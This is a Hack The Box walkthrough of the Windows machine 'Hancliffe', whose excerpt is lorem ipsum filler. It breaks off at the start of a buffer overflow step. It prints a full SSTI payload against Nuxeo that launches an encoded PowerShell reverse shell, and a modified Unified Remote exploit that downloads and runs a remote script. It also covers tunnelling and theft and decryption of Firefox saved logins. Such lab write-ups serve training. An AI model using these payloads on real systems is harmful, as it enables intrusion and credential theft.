---
layout: single
title: Hancliffe - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2022-01-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-hancliffe/hancliffe_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-hancliffe/hancliffe_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
<br>

----------------

# USER
### Step 1

**nmap:**
```bash
┌──(void㉿void)-[~]
└─$ nmap -p- 10.10.11.115        
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
9999/tcp open  abyss

┌──(void㉿void)-[~]
└─$ nmap -p80,8000,9999 -sCV 10.10.11.115
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: Welcome to nginx!
8000/tcp open  http    nginx 1.21.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
|     Welcome Brankas Application.
|     Username: Password:
|   NULL: 
|     Welcome Brankas Application.
|_    Username:
```

**dirb:**
```bash
PORT 80:
+ http://10.10.11.115/con (CODE:500|SIZE:494)
+ http://10.10.11.115/index.html (CODE:200|SIZE:612)
+ http://10.10.11.115/maintenance (CODE:302|SIZE:0)
+ http://10.10.11.115/nul (CODE:500|SIZE:494)

PORT 8000:
==> DIRECTORY: http://10.10.11.115:8000/assets/
+ http://10.10.11.115:8000/con (CODE:500|SIZE:579)
==> DIRECTORY: http://10.10.11.115:8000/includes/
+ http://10.10.11.115:8000/index.php (CODE:200|SIZE:7880)
+ http://10.10.11.115:8000/license (CODE:200|SIZE:34501)
+ http://10.10.11.115:8000/LICENSE (CODE:200|SIZE:34501)
+ http://10.10.11.115:8000/nul (CODE:500|SIZE:579)
```

**nikto:**
```bash
PORT 80:
+ Server: nginx/1.21.0
+ /maintenance/: Admin login page/section found.

PORT 8000:
+ Server: nginx/1.21.0
+ Retrieved x-powered-by header: PHP/8.0.7
```

**ffuf:**
```bash
PORT 80:
maintenance             [Status: 302, Size: 0, Words: 1, Lines: 1]

PORT 8000:
N/A
```

**port 9999**
```bash
┌──(void㉿void)-[~]
└─$ nc 10.10.11.115 9999
Welcome Brankas Application.
Username: anonymous
Password: anonymous
Username or Password incorrect
```

**PORT 80:**
- Visiting http://10.10.11.115/maintenance/ -> 302 Moved /**nuxeo**/Maintenance/
	- Which is probably [nuxeo web ui](https://github.com/nuxeo/nuxeo-web-ui) but unable to fuzz the directory


**PORT 8000:**
- http://10.10.11.115:8000/ is used for [HashPass](https://github.com/scottparry/hashpass)


----------

### Step 2
From our inital checks we found that GET requests on port 80 to `/maintenance/` got 302 Moved to `/nuxeo/Maintenance`, which is odd. Playing some more we find that ..

.. GET `/maintenance/..;/index.jsp` -> 302 Moved `/nuxeo/nxstartup.faces`
.. GET `/maintenance/..;/nuxeo/nxstartup.faces` -> 302 Moved `/nuxeo/login.jsp`
.. GET `/maintenance/..;/login.jsp` -> **200 Found**

We have a login prompt, but no credentials. A quick google and the second result we find is a [authentication bypass rce](https://github.com/mpgn/CVE-2018-16341), which leverages SSTI. 

To see if the target is vulnerable to SSTI we can use this simple test string:

![[Pasted image 20211213154541.png]]

Using [revshell.com](https://revshells.com) we generate a PowerShell #3 (Base64) shell as payload and trigger full SSTI RCE:

```java
http://10.10.11.115/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=%22,null).waitFor()%7D.xhtml
```

```powershell
┌──(void㉿void)-[/htb/hancliffe]
└─$ rlwrap -cAr nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.115] 57150
PS C:\Nuxeo> whoami
hancliffe\svc_account
```

----------

### Step 3
Manually enumerating the machine and we find little to nothing. 

.. some SMTP (default?) credentials:
```powershell
PS C:\Nuxeo\conf\Catalina\localhost> type nuxeo.xml
[... snip ...]
  <Resource auth="Container" name="Mail" type="javax.mail.Session" factory="org.nuxeo.ecm.platform.ec.notification.email.EmailResourceFactory"
    mail.from="noreply@nuxeo.com"
    mail.store.protocol="pop3"
    mail.pop3.host="localhost"
    mail.pop3.port="110"
    mail.pop3.user="anonymous"
    mail.pop3.password="secret"
    mail.transport.protocol="smtp"
    mail.smtp.host="localhost"
    mail.smtp.port="25"
  />
```

.. a few database variables:
```powershell
type pg_env.bat
@ECHO OFF
REM The script sets environment variables helpful for PostgreSQL

@SET PATH="C:\Program Files\PostgreSQL\9.6\bin";%PATH%
@SET PGDATA=C:\Program Files\PostgreSQL\9.6\data
@SET PGDATABASE=postgres
@SET PGUSER=postgres
@SET PGPORT=5432
@SET PGLOCALEDIR=C:\Program Files\PostgreSQL\9.6\share\locale
```

.. and running `netstat` we see there are a lot more services running locally:
```powershell
PS C:\> netstat -ant
Active Connections
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       7100
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       552
  TCP    0.0.0.0:5432           0.0.0.0:0              LISTENING       3284
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       7100
  TCP    0.0.0.0:9510           0.0.0.0:0              LISTENING       4132
  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       4132
  TCP    0.0.0.0:9952           0.0.0.0:0              LISTENING       2328
  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       2848
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1092
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1588
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       656
```

Uploading winPEAS.exe to `C:\Windows\Temp` gives nothing, probably defender or applocker blocking it. But we are able to copy files from a localy hosted SMB share to `C:\Windows\Tasks`.
```powershell
PS C:\Windows\Tasks> copy \\10.10.14.8\share\wp.exe .
PS C:\Windows\Tasks> dir
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----                             
-a----        12/14/2021   1:29 AM        1927680 wp.exe
```

Interesting output from WinPEAS:
```powershell
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
  TCP        0.0.0.0               80            0.0.0.0               0               Listening         7100            C:\nginx\nginx.exe
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         896             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         552             svchost
  TCP        0.0.0.0               5432          0.0.0.0               0               Listening         3284            postgres
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8000          0.0.0.0               0               Listening         7100            C:\nginx\nginx.exe
  TCP        0.0.0.0               9014          0.0.0.0               0               Listening         8116            MyFirstApp
  TCP        0.0.0.0               9510          0.0.0.0               0               Listening         4132            RemoteServerWin
  TCP        0.0.0.0               9512          0.0.0.0               0               Listening         4132            RemoteServerWin

------------------------

    RemoteServerWin(Unified Intents AB - RemoteServerWin)[C:\Program Files (x86)\Unified Remote 3\RemoteServerWin.exe] - Autoload - No quotes and Space detected
```

-------------

### Step 4
Going through all output we find that port 9510 and 9512 (Unified Remote 3) sounds interesting.
```ad-quote
Unified Remote is a **software that lets you use your mobile phone** (Android, iOS, or Windows Phone) to control every aspect of your computer: from handling your keyboard and mouse to managing files on your hard drive.
```
```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ searchsploit "unified remote 3"                                                                                                                       1 ⨯
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
[... snip ...]
Unified Remote 3.9.0.2463 - Remote Code Execution                                                                           | windows/remote/49587.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

There is a RCE vuln that sounds interesting. Use `chisel` to port forward, so we can interact with the port.
I had **A LOT** of problems getting this to work, probably because the default embedded version of chisel (in Kali) did not match my windows binary version.

So smartest thing here is to download and compile new executables for both exe and elf.

```bash
$ sudo git clone https://github.com/jpillora/chisel.git
$ cd chisel

$ sudo GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" .
$ ls -al chisel.exe    
-rwxr-xr-x  1 root root 8556032 Jan  5 13:29 chisel.exe

$ sudo go build -ldflags="-s -w" .
$ ls -al chisel     
-rwxr-xr-x 1 root root 8392704 Jan  5 13:31 chisel
```

```powershell
PS C:\Windows\Tasks> copy \\10.10.14.3\share\chisel.exe .
PS C:\Windows\Tasks> dir

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/14/2021   2:29 AM        8548352 chisel.exe                                                           


┌──(void㉿void)-[/opt/chisel]
└─$ ./chisel server -p 9000 --reverse

PS C:\Windows\Tasks> .\chisel.exe client 10.10.14.3:9000 R:9512:localhost:9512
```

Reading through the Unified Remote RCE script we find that it wants three input arguments, and we need to host a HTTP server to download the payload.
```python
# User Specified arguments
try:
	rhost = sys.argv[1]
	lhost = sys.argv[2]
	payload = sys.argv[3]
except:

[... snip ...]

	print("[+] Opening CMD")
	SendString("cmd.exe", rhost)
	sleep(0.3)
	SendReturn()
	sleep(0.3)
	print("[+] *Super Fast Hacker Typing*")
	SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Windows\\Temp\\" + payload, rhost) # Retrieve HTTP hosted payload
	sleep(0.3)
	print("[+] Downloading Payload")
	SendReturn()
	sleep(3)
	SendString("C:\\Windows\\Temp\\" + payload, rhost) # Execute Payload
```

I struggled with this part for about three hours and modified my script to look like this instead:
```powershell
# User Specified arguments
try:
	rhost = sys.argv[1]
	lhost = sys.argv[2]
except:


[... snip ...]

	print("[+] Opening CMD")
    SendString("powershell.exe", rhost)
	sleep(0.3)
	SendReturn()
	print("[+] Executing Payload")
	sleep(0.3)
    SendString("IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')", rhost) # Execute Payload
	sleep(0.3)
	SendReturn()
    sleep(5)
	print("[+] Done! Check listener?")
```

Setup a HTTP-sever, listener and execute the script
```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ python expl.py 127.0.0.1 10.10.14.3
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] Executing Payload
[+] Done! Check listener?

┌──(void㉿void)-[/htb/hancliffe]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.115 - - [05/Jan/2022 15:25:24] "GET /invoke-powershelltcp.ps1 HTTP/1.1" 200 -

┌──(void㉿void)-[/htb/hancliffe]
└─$ nc -lvnp 4499                                       
listening on [any] 4499 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.115] 62188
Windows PowerShell running as user clara on HANCLIFFE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\clara> type Desktop/user.txt
fbcd97c3cb51969565dfe241c1149a62
```

-------------

<br>

# ROOT

### Step 1 
After a lot of enumeration I came across the Mozilla Firefox profiles containing sensitive files `logins.json`, `key4.db`, `cookies.sqlite` and `cert9.db`.
```powershell
PS C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release> cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"http://localhost:8000","httpRealm":null,"formSubmitURL":"http://localhost:8000","usernameField":"website","passwordField":"masterpassword","encryptedUsername":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECP+7GREfh/OCBBACN8BqXSHhgvedk/ffsRBn","encryptedPassword":"MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEQe5quezh5lBCg7VV7cXOky4tBMinRRncbXJl1YC3P0Ql5J8ZZS6ZnVjg9yXrbOq1Me","guid":"{39d1884b-56cd-4e30-869b-e0d9df6ca9d9}","encType":1,"timeCreated":1624771259387,"timeLastUsed":1624771259387,"timePasswordChanged":1624771259387,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

Copy the files from Windows to Kali using `certutil -encode`.
```powershell
PS C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release> certutil.exe -encode logins.json C:\Windows\Tasks\logins.b64
Input Length = 674
Output Length = 986
CertUtil: -encode command completed successfully.

PS C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release> type C:\Windows\Tasks\logins.b64
-----BEGIN CERTIFICATE-----
eyJuZXh0SWQiOjIsImxvZ2lucyI6W3siaWQiOjEsImhvc3RuYW1lIjoiaHR0cDov
L2xvY2FsaG9zdDo4MDAwIiwiaHR0cFJlYWxtIjpudWxsLCJmb3JtU3VibWl0VVJM
IjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwIiwidXNlcm5hbWVGaWVsZCI6IndlYnNp
dGUiLCJwYXNzd29yZEZpZWxkIjoibWFzdGVycGFzc3dvcmQiLCJlbmNyeXB0ZWRV
c2VybmFtZSI6Ik1Eb0VFUGdBQUFBQUFBQUFBQUFBQUFBQUFBRXdGQVlJS29aSWh2
Y05Bd2NFQ1ArN0dSRWZoL09DQkJBQ044QnFYU0hoZ3ZlZGsvZmZzUkJuIiwiZW5j
cnlwdGVkUGFzc3dvcmQiOiJNRklFRVBnQUFBQUFBQUFBQUFBQUFBQUFBQUV3RkFZ
SUtvWklodmNOQXdjRUNFUWU1cXVlemg1bEJDZzdWVjdjWE9reTR0Qk1pblJSbmNi
WEpsMVlDM1AwUWw1SjhaWlM2Wm5Wamc5eVhyYk9xMU1lIiwiZ3VpZCI6InszOWQx
ODg0Yi01NmNkLTRlMzAtODY5Yi1lMGQ5ZGY2Y2E5ZDl9IiwiZW5jVHlwZSI6MSwi
dGltZUNyZWF0ZWQiOjE2MjQ3NzEyNTkzODcsInRpbWVMYXN0VXNlZCI6MTYyNDc3
MTI1OTM4NywidGltZVBhc3N3b3JkQ2hhbmdlZCI6MTYyNDc3MTI1OTM4NywidGlt
ZXNVc2VkIjoxfV0sInBvdGVudGlhbGx5VnVsbmVyYWJsZVBhc3N3b3JkcyI6W10s
ImRpc21pc3NlZEJyZWFjaEFsZXJ0c0J5TG9naW5HVUlEIjp7fSwidmVyc2lvbiI6
M30=
-----END CERTIFICATE-----
```

And decoding/pasting the file in Kali using `base64 -d`.
```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ echo "eyJuZXh0SWQiOjIsImxvZ2lucyI6W3siaWQiOjEsImhvc3RuYW1lIjoiaHR0cDov
L2xvY2FsaG9zdDo4MDAwIiwiaHR0cFJlYWxtIjpudWxsLCJmb3JtU3VibWl0VVJM
IjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwIiwidXNlcm5hbWVGaWVsZCI6IndlYnNp
dGUiLCJwYXNzd29yZEZpZWxkIjoibWFzdGVycGFzc3dvcmQiLCJlbmNyeXB0ZWRV
c2VybmFtZSI6Ik1Eb0VFUGdBQUFBQUFBQUFBQUFBQUFBQUFBRXdGQVlJS29aSWh2
Y05Bd2NFQ1ArN0dSRWZoL09DQkJBQ044QnFYU0hoZ3ZlZGsvZmZzUkJuIiwiZW5j
cnlwdGVkUGFzc3dvcmQiOiJNRklFRVBnQUFBQUFBQUFBQUFBQUFBQUFBQUV3RkFZ
SUtvWklodmNOQXdjRUNFUWU1cXVlemg1bEJDZzdWVjdjWE9reTR0Qk1pblJSbmNi
WEpsMVlDM1AwUWw1SjhaWlM2Wm5Wamc5eVhyYk9xMU1lIiwiZ3VpZCI6InszOWQx
ODg0Yi01NmNkLTRlMzAtODY5Yi1lMGQ5ZGY2Y2E5ZDl9IiwiZW5jVHlwZSI6MSwi
dGltZUNyZWF0ZWQiOjE2MjQ3NzEyNTkzODcsInRpbWVMYXN0VXNlZCI6MTYyNDc3
MTI1OTM4NywidGltZVBhc3N3b3JkQ2hhbmdlZCI6MTYyNDc3MTI1OTM4NywidGlt
ZXNVc2VkIjoxfV0sInBvdGVudGlhbGx5VnVsbmVyYWJsZVBhc3N3b3JkcyI6W10s
ImRpc21pc3NlZEJyZWFjaEFsZXJ0c0J5TG9naW5HVUlEIjp7fSwidmVyc2lvbiI6
M30=" | base64 -d > logins.json
```

Do the same for the remaining files `key4.db`, `cookies.sqlite` and `cert9.db`.
Save all files in a profile directory, and in the parent directory create `profiles.ini` file.
```bash
┌──(void㉿void)-[/htb/hancliffe/firefox-loot]
└─$ tree                 
.
├── ljftf853.default-release
│   ├── cert9.db
│   ├── cookies.sqlite
│   ├── key4.db
│   └── logins.json
└── profiles.ini

┌──(void㉿void)-[/htb/hancliffe/firefox-loot]
└─$ cat profiles.ini            
[Profile1]
Name=default
IsRelative=1
Path=ljftf853.default-release
Default=1
```

Download and run [firefox_decrypt](https://github.com/unode/firefox_decrypt) to extract the credentials.
```bash
┌──(void㉿void)-[/opt/firefox_decrypt]
└─$ ./firefox_decrypt.py /htb/hancliffe/firefox-loot            

Website:   http://localhost:8000
Username: 'hancliffe.htb'
Password: '#@H@ncLiff3D3velopm3ntM@st3rK3y*!'
```


------

### Step 2
To understand what the `firefox_decrypt` output actually means we can have a closer look into the file `logins.json`.
* `"hostname":"http://localhost:8000"`
- `"usernameField":"website"`
- `"passwordField":"masterpassword"`

From this we are missing one input parameter from the Stageless Password Manager on port 8000, Full Name, but looking on the password (and in `C:\Users\`) we can guess that it should be `development`. Using all found parameters we get the generated password `AMl.q2DHp?2.C/V0kNFU`.

![[Pasted image 20220107103051.png]]

Trying to change user with the standard PS ScriptBlock gives no output:
```powershell
$user = 'development'
$pass = 'AMl.q2DHp?2.C/V0kNFU' | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential($user,$pass)
Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }
```

Nor does the credentials work for the service on port 9999:
```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ nc hancliffe.htb 9999                                               127 ⨯
Welcome Brankas Application.
Username: development
Password: AMl.q2DHp?2.C/V0kNFU
Username or Password incorrect
```

This threw me off guard for a while, before I went back to look on my enumerated data and saw that port **5985** is open locally.

```bash
┌──(void㉿void)-[/opt/chisel]
└─$ ./chisel server -p 9000 --reverse
2022/01/07 10:40:26 server: Reverse tunnelling enabled
2022/01/07 10:40:26 server: Fingerprint N5yEuHLOYJ6FFzk6vpDu7Pi1M2815GcnvXEo7BGBhT0=
2022/01/07 10:40:26 server: Listening on http://0.0.0.0:9000
2022/01/07 10:40:29 server: session#1: tun: proxy#R:5985=>localhost:5985: Listening
```

```powershell
PS C:\Windows\Tasks> .\chisel.exe client 10.10.14.8:9000 R:5985:localhost:5985
```

```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ evil-winrm -i localhost -u development -p "AMl.q2DHp?2.C/V0kNFU"                                                                                      1 ⨯

*Evil-WinRM* PS C:\Users\development\Documents> whoami
hancliffe\development
```

--------------

### Step 3
Next step is pretty obvious, we need to break the application on port 9999 some how to gain a root shell. And looking in C:\DevApp we find the source:
```powershell
*Evil-WinRM* PS C:\DevApp> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe
-a----         9/14/2021  10:57 AM            636 restart.ps1

*Evil-WinRM* PS C:\DevApp> cat restart.ps1
# Restart app every 3 mins to avoid crashes
while($true) {
  # Delete existing forwards
  cmd /c "netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0"
  # Spawn app
  $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ("C:\DevApp\MyFirstApp.exe")
  sleep 2
  # Get random port
  $port = (Get-NetTCPConnection -OwningProcess $proc.ProcessId).LocalPort
  # Forward port to 9999
  cmd /c "netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=$port connectaddress=127.0.0.1"
  sleep 180
  # Kill and repeat
  taskkill /f /t /im MyFirstApp.exe
}
```

Download `MyFirstApp.exe` and start analyze it!
In Ghidra we find a few interesting things..

.. a login function containing username and a base64 encoded password in clear text
![[Pasted image 20220107141328.png]]

.. encryption function `encrypt1`
![[Pasted image 20220111121216.png]]

.. encryption function `encrypt2`
![[Pasted image 20220111120346.png]]

Working our way backwards with the **login function** we can see that.. 

.. line 23, `enc2_len` is the lenght (17) of the base64 DECODED `b64pass` variable
```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ echo "YXlYeDtsbD98eDtsWms5SyU=" | base64 -d | wc -c
17
```

.. line 22, `local_20` get the data from `enc2Data`
```bash
┌──(void㉿void)-[/htb/hancliffe]
└─$ echo "YXlYeDtsbD98eDtsWms5SyU=" | base64 -d        
ayXx;ll?|x;lZk9K%
```


Trying to understand the functions to 100% I decided to replicate the code in Python. After being stuck for a good while I got a hint, the password to the executable is **`K3r4j@@nM4j@pAh!T`**. With this we know that after running the password through the encryption algorithms, we should ge the product `ayXx;ll?|x;lZk9K%`, which is a huge guidance.

After **days** of troubleshooting I finally was finally able to find a massive error, from Ghidra. In the disasembly `0x61` was some how translated to `0x9f` in the code, making all my calculation incorrenct.
![[Pasted image 20220112124309.png]]


After fixing this I was able to replicate the encryption algorithms.
```python
[root:/git/htb/hancliffe]# cat enc.py                                                                                              (master✱) 
#!/usr/bin/python3
import binascii

pw = "K3r4j@@nM4j@pAh!T"
size = len(pw)

#enc1_pw = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
enc1_pw = ["K","3","r","4","j","@","@","n","M","4","j","@","p","A","h","!","T"]
print("==== ENCRYPTION 1 ====")
for i in range(size):
    #print("ENC1_PW:", enc1_pw[i], ord(enc1_pw[i]))
    
    if ((32 < ord(enc1_pw[i])) and (ord(enc1_pw[i]) != 127)):
        holder = ord(enc1_pw[i]) + 47
        #print("IF1:", pw[i], ord(pw[i]), holder)
        
        if (ord(enc1_pw[i]) + 47 < 127):
            enc1_pw[i] = holder
            #print("IF2:", enc1_pw[i])
        
        else:
            enc1_pw[i] = holder - 94
            #print("ELSE:", enc1_pw[i])

print("ENC1:", enc1_pw)

print("\n==== ENCRYPTION 2 ====")

enc2_pw = enc1_pw
for i in range(size):
    holder2 = enc1_pw[i]
    #print("HOLDER2:", holder2)
    if ((holder2 < 65) or (90 < holder2 and holder2 < 97) or (122 < holder2)):
        enc2_pw[i] = holder2
        #print("IF1:", holder2)
    else:
        var2 = holder2 < 91
        if (var2):
            holder2 = holder2 + 32
            #print("IF2:", holder2)
        
        enc2_pw[i] = ord("z") - (holder2 - 97)

        if (var2):
            enc2_pw[i] = enc2_pw[i] - 32

print("ENC2:", enc2_pw)
print("CORR: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]")
```

```bash
[root:/git/htb/hancliffe]# ./enc.py
==== ENCRYPTION 1 ====
ENC1: [122, 98, 67, 99, 59, 111, 111, 63, 124, 99, 59, 111, 65, 112, 57, 80, 37]

==== ENCRYPTION 2 ====
ENC2: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]
CORR: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]
```


Looking for strings in the binary we find a few more interesting lines that might be usefull later.
![[Pasted image 20220107130131.png]]


-------

### Step 4
With a deeper understanding of the binary we can simply reverse it by changing the orders of enc1 and enc2. 
```python
[root:/git/htb/hancliffe]# cat dec.py                                                                                              (master✱) 
#!/usr/bin/python3
import base64

#b64pw = "YXlYeDtsbD98eDtsWms5SyU="
b64pw = input("Enter Base64 to Reverse: ")
decode = base64.b64decode(b64pw)
enc2_pw = [chr(p) for p in decode]

for i in range (len(enc2_pw)):
    holder2 = ord(enc2_pw[i])
    if ((holder2 < 65) or (90 < holder2 and holder2 < 97) or (122 < holder2)):
        enc2_pw[i] = holder2
    else:
        var2 = holder2 < 91
        if (var2):
            holder2 = holder2 + 32
        enc2_pw[i] = ord("z") - (holder2 - 97)
        if (var2):
            enc2_pw[i] = enc2_pw[i] - 32

enc1_pw = enc2_pw
for i in range (len(enc2_pw)):
    if ((32 < enc1_pw[i]) and (enc1_pw[i] != 127)):
        holder = enc1_pw[i] + 47
        if (enc1_pw[i] + 47 < 127):
            enc1_pw[i] = holder
        else:
            enc1_pw[i] = holder - 94

password = [chr(x) for x in enc1_pw]
print("Password: ", *password, sep='')
```

```bash
[root:/git/htb/hancliffe]# ./dec.py
Enter Base64 to Reverse: YXlYeDtsbD98eDtsWms5SyU=
Password: K3r4j@@nM4j@pAh!T
```

Running the application we can use the `FullName` and `Code` we found from the strings. The application unlocks but closes directly. Maybe it is at this point we should break the application through any of the other input variables.
```bash
[root:/git/htb/hancliffe]# nc 10.10.11.115 9999
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: Vickry Alfiansyah
Input Your Code: T3D83CbJkl1299
Unlocked
```

--------------

### Step 5
Playing around with the application (locally) it seems that it's vulnerable to **buffer overflow** in the `Code` input variable. 
```bash
[root:/git/htb/hancliffe]# nc 172.30.1.118 9449
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: asdf
